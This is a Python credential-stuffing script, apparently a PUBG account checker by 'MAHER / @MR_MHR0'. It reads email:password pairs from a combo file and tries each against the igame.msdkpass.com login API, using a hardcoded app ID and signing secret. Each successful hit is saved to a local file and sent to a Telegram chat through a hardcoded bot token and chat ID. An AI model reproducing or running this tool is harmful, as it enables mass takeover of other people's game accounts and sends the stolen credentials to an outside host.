#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import requests
import hashlib
import time

# ------------------------------------------------------------------
# Configuration – replace with your own values
# ------------------------------------------------------------------
BOT_CHAT_ID = "6868957646"                     # Your Telegram chat ID
BOT_TOKEN   = "8933580172:AAEKJI4CBlIv5dXoT7wVVi9ygm2AozbIMZY"
COMBO_FILE  = "pure_random_combo_300k.txt"     # Combo file name
# ------------------------------------------------------------------

# Clear console once at startup
os.system('cls' if os.name == 'nt' else 'clear')

# ------------------------------------------------------------------
# Banner
# ------------------------------------------------------------------
print("""
--------------------------------------------------
██████╗ ██╗   ██╗██████╗  ██████╗
██╔══██╗██║   ██║██╔══██╗██╔════╝ 
██████╔╝██║   ██║██████╔╝██║  ███╗
██╔═══╝ ██║   ██║██╔══██╗██║   ██║
██║     ╚██████╔╝██████╔╝╚██████╔╝
╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ 
       BY : MAHER / @MR_MHR0
--------------------------------------------------
""")

# ------------------------------------------------------------------
# HTTP session and headers
# ------------------------------------------------------------------
session = requests.Session()
HEADERS = {
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
    "Host": "igame.msdkpass.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Length": "126"
}

# ------------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------------
def _send_telegram(msg: str) -> None:
    """Send a message to the configured Telegram chat."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {"chat_id": BOT_CHAT_ID, "text": msg}
    try:
        session.get(url, params=params, timeout=10)
    except Exception as e:
        print(f"[!] Telegram send failed: {e}")

def _check_combo(email: str, password: str) -> None:
    """Attempt to log in with the provided credentials."""
    # MD5 of password
    pwd_md5 = hashlib.md5(password.encode()).hexdigest()

    # Signature calculation
    body_json = f'{{"account":"{email}","account_type":1,"area_code":"","extra_json":"","password":"{pwd_md5}"}}'
    sign_payload = f"/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{body_json}3ec8cd69d71b7922e2a17445840866b26d86e283"
    signature = hashlib.md5(sign_payload.encode()).hexdigest()

    url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={signature}"
    time.sleep(0.5)  # Rate‑limit guard
    response = session.get(url, data=body_json, headers=HEADERS).text

    if '"token"' in response:
        msg = (
            f"[✓] HI, MAHER NEW ACC PUBG :\n"
            f"[✓] Email: {email}\n"
            f"[✓] Pass: {password}\n"
            "━━━━━━━━━━━━━"
        )
        print(msg)
        _send_telegram(msg)
        with open("NWE-PUBG.txt", "a", encoding="utf-8") as f:
            f.write(f"{email}:{password} |@MR_MHR0\n")
    else:
        msg = (
            f"[-] NOT Hacked PUBG :\n"
            f"[-] Email: {email}\n"
            f"[-] Pass: {password}\n"
            "━━━━━━━━━━━━━"
        )
        print(msg)

def _process_combo_file(file_path: str) -> None:
    """Read the combo file and validate each line."""
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line_num, raw_line in enumerate(f, 1):
                line = raw_line.strip()
                if not line:
                    continue
                if ':' not in line:
                    print(f"[-] Invalid line {line_num}: {line!r}")
                    continue
                email, pwd = line.split(":", 1)
                if not email or not pwd:
                    print(f"[-] Invalid line {line_num}: {line!r}")
                    continue
                print(f"[+] Valid format: line {line_num}")
                _check_combo(email, pwd)
    except FileNotFoundError:
        print(f"\n[-] Combo file not found: {file_path}\n")

# ------------------------------------------------------------------
# Main execution
# ------------------------------------------------------------------
if __name__ == "__main__":
    _process_combo_file(COMBO_FILE)